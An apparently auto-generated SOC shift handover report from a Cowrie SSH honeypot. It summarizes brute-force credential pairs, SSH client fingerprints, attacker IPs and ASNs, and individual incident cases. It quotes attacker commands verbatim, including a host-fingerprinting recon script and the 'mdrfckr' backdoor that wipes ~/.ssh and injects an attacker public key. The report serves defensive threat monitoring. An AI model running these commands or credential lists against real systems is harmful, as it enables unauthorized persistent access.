# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-24 |
| **Generated At** | 2026-08-24T07:05:30Z |
| **Shift Time** | 07:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **459** |
| Confirmed Threats | **433** |
| False Positives Filtered | **26** (5.7%) |
| Unique Attacker IPs | **141** |
| Countries of Origin | **40** |
| High Severity Cases | **162** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **297** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **209** |
| Unique Credential Pairs | **108** |
| Unique Usernames | **20** |
| Unique Passwords | **105** |
| Successful Auth Pairs | **182** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 53 |
| `ubuntu` | 28 |
| `test` | 20 |
| `unknown` | 15 |
| `debian` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 7 |
| `debian2009` | 6 |
| `unknown2021` | 6 |
| `abcd1234` | 6 |
| `operator2008` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `debian` | `debian2009` | 6 |
| `unknown` | `unknown2021` | 6 |
| `pi` | `abcd1234` | 6 |
| `operator` | `operator2008` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `Drs123` | `217.60.255.130` | 2026-08-24T02:56:37 |
| `root` | `Aa12345678!` | `217.60.255.130` | 2026-08-24T02:56:44 |
| `root` | `123456789aA@` | `103.200.25.198` | 2026-08-24T02:58:03 |
| `345gs5662d34` | `345gs5662d34` | `103.200.25.198` | 2026-08-24T02:58:08 |
| `root` | `3245gs5662d34` | `103.200.25.198` | 2026-08-24T02:58:09 |
| `debian` | `debian2009` | `10.0.0.73` | 2026-08-24T02:58:47 |
| `ubuntu` | `asdasd123` | `217.60.255.130` | 2026-08-24T03:06:10 |
| `root` | `password$123` | `217.60.255.130` | 2026-08-24T03:06:14 |
| `guest` | `guest2002` | `122.187.230.38` | 2026-08-24T03:07:29 |
| `guest` | `guest2002` | `70.89.116.5` | 2026-08-24T03:07:37 |
| `test` | `test2015` | `182.95.190.150` | 2026-08-24T03:12:27 |
| `ubuntu` | `Admin123.` | `217.60.255.130` | 2026-08-24T03:15:37 |
| `root` | `n@123456` | `217.60.255.130` | 2026-08-24T03:15:40 |
| `debian` | `debian2009` | `113.108.88.121` | 2026-08-24T03:16:30 |
| `debian` | `debian2009` | `115.68.133.201` | 2026-08-24T03:16:39 |
| `debian` | `debian2009` | `117.250.250.2` | 2026-08-24T03:16:43 |
| `debian` | `debian2009` | `43.134.165.86` | 2026-08-24T03:16:52 |
| `support` | `support` | `10.0.0.73` | 2026-08-24T03:18:10 |
| `ubuntu` | `root@1234` | `190.181.27.37` | 2026-08-24T03:19:22 |
| `345gs5662d34` | `345gs5662d34` | `190.181.27.37` | 2026-08-24T03:19:25 |
| `ubuntu` | `3245gs5662d34` | `190.181.27.37` | 2026-08-24T03:19:25 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-24T03:20:16 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-24T03:20:16 |
| `nobody` | `nobody2019` | `10.0.0.73` | 2026-08-24T03:20:18 |
| `nobody` | `nobody2019` | `121.167.110.137` | 2026-08-24T03:21:49 |
| `nobody` | `nobody2019` | `87.225.108.138` | 2026-08-24T03:21:58 |
| `test` | `test2015` | `10.0.0.73` | 2026-08-24T03:23:46 |
| `ubuntu` | `admin@888` | `217.60.255.130` | 2026-08-24T03:25:15 |
| `root` | `Passwrod1234` | `217.60.255.130` | 2026-08-24T03:25:19 |
| `test` | `test2014` | `10.0.0.73` | 2026-08-24T03:31:53 |
| `ubuntu` | `praxis` | `217.60.255.130` | 2026-08-24T03:34:37 |
| `root` | `qwerty123$` | `217.60.255.130` | 2026-08-24T03:34:41 |
| `nobody` | `nobody2019` | `217.24.185.98` | 2026-08-24T03:37:34 |
| `test` | `test2015` | `170.233.29.175` | 2026-08-24T03:40:36 |
| `test` | `test2015` | `125.20.207.154` | 2026-08-24T03:40:45 |
| `ubuntu` | `ftpuser123!` | `217.60.255.130` | 2026-08-24T03:44:10 |
| `root` | `Test@1234` | `217.60.255.130` | 2026-08-24T03:44:14 |
| `unknown` | `unknown2021` | `112.29.68.22` | 2026-08-24T03:45:43 |
| `unknown` | `unknown2021` | `183.103.216.254` | 2026-08-24T03:45:54 |
| `test` | `test2014` | `109.186.74.107` | 2026-08-24T03:49:47 |
| `test` | `test2014` | `104.248.83.99` | 2026-08-24T03:49:53 |
| `test` | `test2014` | `209.145.59.90` | 2026-08-24T03:50:12 |
| `ubuntu` | `master#2025` | `217.60.255.130` | 2026-08-24T03:53:38 |
| `root` | `Azerty@123` | `217.60.255.130` | 2026-08-24T03:53:42 |
| `admin` | `admin` | `163.7.1.156` | 2026-08-24T03:54:39 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-24T03:54:40 |
| `root` | `root2012` | `110.44.126.195` | 2026-08-24T03:54:45 |
| `root` | `root2012` | `177.244.29.30` | 2026-08-24T03:54:54 |
| `unknown` | `unknown2021` | `10.0.0.73` | 2026-08-24T03:56:55 |
| `ubuntu` | `xxx` | `217.60.255.130` | 2026-08-24T04:03:07 |
| `root` | `pakistan@123` | `217.60.255.130` | 2026-08-24T04:03:11 |
| `blank` | `blank2003` | `10.0.0.73` | 2026-08-24T04:04:41 |
| `support` | `support` | `176.53.159.196` | 2026-08-24T04:05:25 |
| `root` | `root2012` | `59.93.107.172` | 2026-08-24T04:10:16 |
| `root` | `root2012` | `116.228.195.251` | 2026-08-24T04:10:25 |
| `ubuntu` | `!Admin1234` | `217.60.255.130` | 2026-08-24T04:12:46 |
| `root` | `Zxcvbnm123` | `217.60.255.130` | 2026-08-24T04:12:49 |
| `unknown` | `unknown2021` | `111.39.167.59` | 2026-08-24T04:13:11 |
| `unknown` | `unknown2021` | `176.103.15.169` | 2026-08-24T04:13:19 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-24T04:20:53 |
| `blank` | `blank2003` | `85.228.158.217` | 2026-08-24T04:22:14 |
| `ubuntu` | `admin#1` | `217.60.255.130` | 2026-08-24T04:22:22 |
| `root` | `P@$sw0rd` | `217.60.255.130` | 2026-08-24T04:22:26 |
| `blank` | `blank2003` | `65.20.133.56` | 2026-08-24T04:22:28 |
| `unknown` | `123abc` | `10.0.0.73` | 2026-08-24T04:25:36 |
| `unknown` | `123abc` | `62.201.212.54` | 2026-08-24T04:27:06 |
| `unknown` | `123abc` | `180.151.254.217` | 2026-08-24T04:27:14 |
| `centos` | `centos2006` | `10.0.0.73` | 2026-08-24T04:29:05 |
| `ubuntu` | `Abc123654` | `217.60.255.130` | 2026-08-24T04:31:49 |
| `root` | `1Qwerty` | `217.60.255.130` | 2026-08-24T04:31:52 |
| `root` | `root2018` | `10.0.0.73` | 2026-08-24T04:37:03 |
| `root` | `!root` | `2.57.122.168` | 2026-08-24T04:39:30 |
| `ubuntu` | `rootroot` | `217.60.255.130` | 2026-08-24T04:41:20 |
| `root` | `Password1!` | `217.60.255.130` | 2026-08-24T04:41:24 |
| `wwww` | `wwww` | `120.48.90.166` | 2026-08-24T04:41:58 |
| `unknown` | `123abc` | `177.244.29.30` | 2026-08-24T04:42:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.114.79` | 2026-08-24T04:43:26 |
| `*1` | `$4` | `207.175.114.79` | 2026-08-24T04:43:35 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5547` | `207.175.114.79` | 2026-08-24T04:43:37 |
| `root` | `111111` | `2.57.122.168` | 2026-08-24T04:44:00 |
| `centos` | `centos2006` | `121.164.135.251` | 2026-08-24T04:45:34 |
| `centos` | `centos2006` | `118.122.196.230` | 2026-08-24T04:45:44 |
| `root` | `123123` | `2.57.122.168` | 2026-08-24T04:47:44 |
| `operator` | `operator2008` | `180.183.248.41` | 2026-08-24T04:50:35 |
| `operator` | `operator2008` | `138.122.242.42` | 2026-08-24T04:50:49 |
| `ubuntu` | `P@ss12345` | `217.60.255.130` | 2026-08-24T04:50:49 |
| `root` | `QWEqwe123` | `217.60.255.130` | 2026-08-24T04:50:52 |
| `root` | `1234` | `2.57.122.168` | 2026-08-24T04:51:57 |
| `root` | `root2018` | `107.135.117.245` | 2026-08-24T04:54:49 |
| `root` | `root2018` | `125.139.124.120` | 2026-08-24T04:55:04 |
| `root` | `root2018` | `112.28.153.238` | 2026-08-24T04:55:14 |
| `root` | `12345` | `2.57.122.168` | 2026-08-24T04:55:36 |
| `admin` | `admin2011` | `203.192.211.180` | 2026-08-24T04:59:35 |
| `admin` | `admin2011` | `111.53.131.79` | 2026-08-24T04:59:44 |
| `ubuntu` | `Sec@123` | `217.60.255.130` | 2026-08-24T05:00:21 |
| `root` | `123qweQWE!@#` | `217.60.255.130` | 2026-08-24T05:00:25 |
| `operator` | `operator2008` | `10.0.0.73` | 2026-08-24T05:01:31 |
| `root` | `12345678` | `2.57.122.168` | 2026-08-24T05:01:58 |
| `root` | `123456789` | `2.57.122.168` | 2026-08-24T05:05:32 |
| `root` | `P@ssw0rd` | `2.57.122.168` | 2026-08-24T05:09:39 |
| `test` | `test2000` | `10.0.0.73` | 2026-08-24T05:09:43 |
| `ubuntu` | `Secure@123` | `217.60.255.130` | 2026-08-24T05:09:47 |
| `root` | `zxcASDqwe!@#` | `217.60.255.130` | 2026-08-24T05:09:51 |
| `odoo` | `odoo@1234` | `119.209.12.20` | 2026-08-24T05:10:17 |
| `345gs5662d34` | `345gs5662d34` | `119.209.12.20` | 2026-08-24T05:10:20 |
| `odoo` | `3245gs5662d34` | `119.209.12.20` | 2026-08-24T05:10:22 |
| `admin` | `admin2011` | `62.221.107.99` | 2026-08-24T05:14:56 |
| `admin` | `admin2011` | `71.236.99.31` | 2026-08-24T05:15:03 |
| `root` | `Password1` | `2.57.122.168` | 2026-08-24T05:17:32 |
| `operator` | `operator2008` | `65.20.138.3` | 2026-08-24T05:18:02 |
| `operator` | `operator2008` | `63.42.190.239` | 2026-08-24T05:18:14 |
| `ubuntu` | `india@123` | `217.60.255.130` | 2026-08-24T05:19:17 |
| `root` | `asdf1234` | `217.60.255.130` | 2026-08-24T05:19:21 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-24T05:20:29 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.241.157.87` | 2026-08-24T05:20:39 |
| `*1` | `$4` | `35.241.157.87` | 2026-08-24T05:20:52 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4546` | `35.241.157.87` | 2026-08-24T05:20:54 |
| `root` | `Root123` | `2.57.122.168` | 2026-08-24T05:21:09 |
| `guest` | `guest2013` | `65.20.143.19` | 2026-08-24T05:22:56 |
| `guest` | `guest2013` | `169.211.207.4` | 2026-08-24T05:23:04 |
| `root` | `admin` | `2.57.122.168` | 2026-08-24T05:24:16 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `8.216.8.182` | 2026-08-24T05:25:23 |
| `test` | `test2000` | `61.143.227.17` | 2026-08-24T05:27:14 |
| `test` | `test2000` | `24.89.134.244` | 2026-08-24T05:27:23 |
| `test` | `test2000` | `200.89.159.59` | 2026-08-24T05:27:29 |
| `test` | `test2000` | `220.80.223.144` | 2026-08-24T05:27:38 |
| `ubuntu` | `changeme` | `217.60.255.130` | 2026-08-24T05:28:44 |
| `root` | `@dmin@2024` | `217.60.255.130` | 2026-08-24T05:28:48 |
| `config` | `config2005` | `10.0.0.73` | 2026-08-24T05:30:31 |
| `config` | `config2005` | `85.99.93.200` | 2026-08-24T05:31:59 |
| `config` | `config2005` | `37.255.213.72` | 2026-08-24T05:32:16 |
| `guest` | `guest2013` | `10.0.0.73` | 2026-08-24T05:34:08 |
| `ubuntu` | `Support2025` | `217.60.255.130` | 2026-08-24T05:38:16 |
| `root` | `@dmin@123` | `217.60.255.130` | 2026-08-24T05:38:20 |
| `config` | `config2005` | `58.104.77.75` | 2026-08-24T05:47:24 |
| `admin` | `admin` | `34.53.180.80` | 2026-08-24T05:47:33 |
| `config` | `config2005` | `180.76.52.146` | 2026-08-24T05:47:36 |
| `ubuntu` | `test2024@` | `217.60.255.130` | 2026-08-24T05:47:49 |
| `root` | `Qaz@1234` | `217.60.255.130` | 2026-08-24T05:47:53 |
| `guest` | `guest2013` | `218.59.235.170` | 2026-08-24T05:50:29 |
| `guest` | `guest2013` | `115.68.133.201` | 2026-08-24T05:50:37 |
| `support` | `support2001` | `94.228.240.2` | 2026-08-24T05:55:26 |
| `support` | `support2001` | `123.129.245.249` | 2026-08-24T05:55:34 |
| `ubuntu` | `12qwaszx` | `217.60.255.130` | 2026-08-24T05:57:17 |
| `root` | `@123456789` | `217.60.255.130` | 2026-08-24T05:57:21 |
| `unknown` | `unknown2008` | `203.188.242.10` | 2026-08-24T05:59:46 |
| `unknown` | `unknown2008` | `81.215.2.43` | 2026-08-24T05:59:54 |
| `unknown` | `unknown2008` | `62.148.236.52` | 2026-08-24T06:00:02 |
| `unknown` | `unknown2008` | `91.92.133.195` | 2026-08-24T06:00:09 |
| `debian` | `debian2008` | `10.0.0.73` | 2026-08-24T06:02:59 |
| `debian` | `debian2008` | `92.84.21.186` | 2026-08-24T06:04:32 |
| `debian` | `debian2008` | `45.187.33.152` | 2026-08-24T06:04:40 |
| `support` | `support2001` | `10.0.0.73` | 2026-08-24T06:06:33 |
| `ubuntu` | `Pa$$word` | `217.60.255.130` | 2026-08-24T06:06:49 |
| `root` | `Apple@2023` | `217.60.255.130` | 2026-08-24T06:06:52 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.108.93` | 2026-08-24T06:12:45 |
| `*1` | `$4` | `34.77.108.93` | 2026-08-24T06:12:59 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2811` | `34.77.108.93` | 2026-08-24T06:13:01 |
| `admin` | `admin2005` | `10.0.0.73` | 2026-08-24T06:14:41 |
| `ubuntu` | `rootadmin` | `217.60.255.130` | 2026-08-24T06:16:18 |
| `root` | `Apple2025` | `217.60.255.130` | 2026-08-24T06:16:22 |
| `debian` | `debian2008` | `38.199.201.3` | 2026-08-24T06:19:57 |
| `ubuntu` | `Admin!234` | `217.60.255.130` | 2026-08-24T06:25:49 |
| `root` | `Server@2025` | `217.60.255.130` | 2026-08-24T06:25:53 |
| `operator` | `operator2002` | `177.72.87.7` | 2026-08-24T06:28:00 |
| `operator` | `operator2002` | `1.20.178.157` | 2026-08-24T06:28:09 |
| `admin` | `admin2005` | `123.52.202.92` | 2026-08-24T06:32:24 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-24T06:32:25 |
| `test` | `test2011` | `10.0.0.73` | 2026-08-24T06:35:16 |
| `ubuntu` | `Exchange@123` | `217.60.255.130` | 2026-08-24T06:35:34 |
| `root` | `Cloud@1234` | `217.60.255.130` | 2026-08-24T06:35:38 |
| `test` | `test2011` | `101.13.5.50` | 2026-08-24T06:36:52 |
| `operator` | `operator2002` | `10.0.0.73` | 2026-08-24T06:38:52 |
| `ubuntu` | `Server01` | `217.60.255.130` | 2026-08-24T06:45:11 |
| `root` | `123456A!` | `217.60.255.130` | 2026-08-24T06:45:15 |
| `root` | `Lx123456@` | `120.48.90.166` | 2026-08-24T06:45:18 |
| `345gs5662d34` | `345gs5662d34` | `120.48.90.166` | 2026-08-24T06:45:28 |
| `guest` | `guest2010` | `10.0.0.73` | 2026-08-24T06:47:05 |
| `test` | `test2011` | `187.218.57.50` | 2026-08-24T06:52:20 |
| `test` | `test2011` | `117.211.15.106` | 2026-08-24T06:52:29 |
| `ubuntu` | `@dmin2025*` | `217.60.255.130` | 2026-08-24T06:54:51 |
| `root` | `123@Password` | `217.60.255.130` | 2026-08-24T06:54:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **459** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 84 |
| OpenSSH | 75 |
| Go SSH scanner | 17 |
| Unknown | 3 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 72 | 69 |
| `419da4c91ddb...` | Modern SSH client | 52 | 1 |
| `f555226df196...` | Mirai/variant | 15 | 4 |
| `2ec37a7cc8da...` | Mirai/variant | 12 | 1 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 72 | 69 | Mirai/variant |
| `419da4c91ddb...` | libssh | 52 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 15 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 15 | 5 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 12 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 11 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `119.209.12.20`, `190.181.27.37`, `103.200.25.198`, `120.48.90.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **141** |
| Unique ASNs | **92** |
| High-Risk ASNs | **81** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 9 | HIGH |
| `AS4766` | Korea Telecom | 7 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 5 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 4 | HIGH |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS12389` | PJSC Rostelecom | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (162)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c37dc546c1b2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:56 |
| **Last Seen** | 2026-08-24 02:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:56:36` | `cowrie.session.connect` |
| `2026-08-24 02:56:36` | `cowrie.client.version` |
| `2026-08-24 02:56:36` | `cowrie.client.kex` |
| `2026-08-24 02:56:37` | `cowrie.login.success` |
| `2026-08-24 02:56:43` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa50081caed

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:56 |
| **Last Seen** | 2026-08-24 02:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:56:43` | `cowrie.session.connect` |
| `2026-08-24 02:56:43` | `cowrie.client.version` |
| `2026-08-24 02:56:43` | `cowrie.client.kex` |
| `2026-08-24 02:56:44` | `cowrie.login.success` |
| `2026-08-24 02:56:50` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-912d57124f58

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-08-24 02:58 |
| **Last Seen** | 2026-08-24 02:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:58:02` | `cowrie.session.connect` |
| `2026-08-24 02:58:02` | `cowrie.client.version` |
| `2026-08-24 02:58:03` | `cowrie.client.kex` |
| `2026-08-24 02:58:03` | `cowrie.login.success` |
| `2026-08-24 02:58:04` | `cowrie.session.params` |
| `2026-08-24 02:58:04` | `cowrie.command.input` |
| `2026-08-24 02:58:04` | `cowrie.command.failed` |
| `2026-08-24 02:58:05` | `cowrie.log.closed` |
| `2026-08-24 02:58:06` | `cowrie.session.params` |
| `2026-08-24 02:58:06` | `cowrie.command.input` |
| `2026-08-24 02:58:06` | `cowrie.session.file_download` |
| `2026-08-24 02:58:06` | `cowrie.log.closed` |
| `2026-08-24 02:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f178f6601f5d

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-08-24 02:58 |
| **Last Seen** | 2026-08-24 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:58:06` | `cowrie.session.connect` |
| `2026-08-24 02:58:06` | `cowrie.client.version` |
| `2026-08-24 02:58:07` | `cowrie.client.kex` |
| `2026-08-24 02:58:08` | `cowrie.login.success` |
| `2026-08-24 02:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48898f0349d0

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-08-24 02:58 |
| **Last Seen** | 2026-08-24 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:58:08` | `cowrie.session.connect` |
| `2026-08-24 02:58:08` | `cowrie.client.version` |
| `2026-08-24 02:58:08` | `cowrie.client.kex` |
| `2026-08-24 02:58:09` | `cowrie.login.success` |
| `2026-08-24 02:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-335c69096efd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:06 |
| **Last Seen** | 2026-08-24 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:06:09` | `cowrie.session.connect` |
| `2026-08-24 03:06:09` | `cowrie.client.version` |
| `2026-08-24 03:06:09` | `cowrie.client.kex` |
| `2026-08-24 03:06:10` | `cowrie.login.success` |
| `2026-08-24 03:06:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 03:06:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 03:06:10` | `cowrie.direct-tcpip.data` |
| `2026-08-24 03:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-340f37345cee

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 03:06 |
| **Last Seen** | 2026-08-24 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 03:06:13` | `cowrie.session.connect` |
